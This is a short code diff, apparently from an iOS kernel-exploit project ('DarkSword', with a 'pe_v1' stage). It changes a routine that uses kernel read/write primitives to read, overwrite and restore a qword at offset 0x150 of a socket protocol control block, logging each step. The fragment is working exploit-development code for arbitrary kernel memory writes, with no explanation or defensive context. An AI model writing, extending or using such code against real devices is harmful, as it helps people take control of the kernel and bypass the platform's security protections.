@@ -1479,27 +1479,21 @@ cleanup:
         }
 
         // ---- KRW proc write test (type 0x21) via krw_zone_write_qword ----
-        // Use DarkSword's proven write path (krw_zone_write_qword) not gPrimitives.kwritebuf.
         [r appendString:@"\n--- KRW proc write test (type 0x21, krw_zone_write_qword) ---\n"];
         {
             extern uint64_t darksword_rw_socket_pcb(void);
-            extern krw_zone_verdict krw_zone_write_qword(uint64_t dst, uint64_t value,
-                                                          uint64_t objBase, uint64_t objSize);
-            extern krw_zone_verdict krw_zone_read_qword(uint64_t src, uint64_t *value,
-                                                         uint64_t objBase, uint64_t objSize);
             uint64_t pcb = darksword_rw_socket_pcb();
-            if (pcb) {
+            if (pcb && gPrimitives.kreadbuf) {
                 scopeNote(r, [NSString stringWithFormat:@"  darksword pcb = 0x%016llx", pcb]);
                 uint64_t orig = 0;
-                krw_zone_read_qword(pcb + 0x150, &orig, pcb, 0x200);
+                gPrimitives.kreadbuf(pcb + 0x150, &orig, 8);
                 scopeNote(r, [NSString stringWithFormat:
                     @"  pcb+0x150 (chksum) read: 0x%016llx", orig]);
                 uint64_t testVal = 0x1122334455667788ULL;
                 krw_zone_verdict v = krw_zone_write_qword(pcb + 0x150, testVal, pcb, 0x200);
-                scopeNote(r, [NSString stringWithFormat:
-                    @"  write verdict=%d", (int)v]);
+                scopeNote(r, [NSString stringWithFormat:@"  write verdict=%d", (int)v]);
                 uint64_t readBack = 0;
-                krw_zone_read_qword(pcb + 0x150, &readBack, pcb, 0x200);
+                gPrimitives.kreadbuf(pcb + 0x150, &readBack, 8);
                 scopeNote(r, [NSString stringWithFormat:
                     @"  pcb+0x150 write test: wrote 0x%016llx  readback=0x%016llx",
                     testVal, readBack]);
@@ -1511,7 +1505,7 @@ cleanup:
                 krw_zone_write_qword(pcb + 0x150, orig, pcb, 0x200);
                 scopeNote(r, @"  restored original value");
             } else {
-                scopeNote(r, @"  darksword pcb not available — run pe_v1 first");
+                scopeNote(r, @"  darksword pcb or kreadbuf not available — run pe_v1 first");
             }
         }
     }
